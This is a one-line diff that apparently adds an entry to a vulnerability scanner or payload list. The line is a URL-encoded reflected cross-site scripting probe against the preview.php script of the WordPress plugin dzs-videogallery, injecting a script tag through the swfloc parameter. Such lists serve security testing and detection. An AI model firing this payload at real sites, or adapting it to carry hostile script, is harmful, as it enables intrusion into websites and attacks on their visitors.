@@ -1,0 +1,1 @@
+/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?swfloc=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
